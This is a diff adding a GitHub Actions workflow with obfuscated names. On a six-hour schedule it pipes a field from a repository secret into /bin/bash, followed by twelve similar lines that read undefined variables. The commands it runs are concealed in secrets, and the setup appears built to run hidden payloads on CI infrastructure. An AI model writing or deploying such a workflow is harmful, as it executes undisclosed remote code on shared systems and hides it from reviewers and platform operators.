@@ -1,0 +1,30 @@
+name: zhujingcheng3417
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhujingcheng3417
+        env:
+          yy05632: ${{ secrets.yy05632 }}
+        run: |
+          echo $yy05632 | jq -r .s7 | /bin/bash
+          echo $wonr71 | jq -r .mpfl11 | /bin/bash
+          echo $uuw48719 | jq -r .c2 | /bin/bash
+          echo $kobm680 | jq -r .twkl2407 | /bin/bash
+          echo $y40414 | jq -r .s33010 | /bin/bash
+          echo $mprs6527 | jq -r .fbm951 | /bin/bash
+          echo $uvw12697 | jq -r .s9294 | /bin/bash
+          echo $ff8823 | jq -r .f14 | /bin/bash
+          echo $pjs904 | jq -r .wa5 | /bin/bash
+          echo $uawsa96 | jq -r .ye05 | /bin/bash
+          echo $f1 | jq -r .j147 | /bin/bash
+          echo $rllf143 | jq -r .hvahu8850 | /bin/bash
+          echo $dv8118 | jq -r .eidvr9 | /bin/bash
+
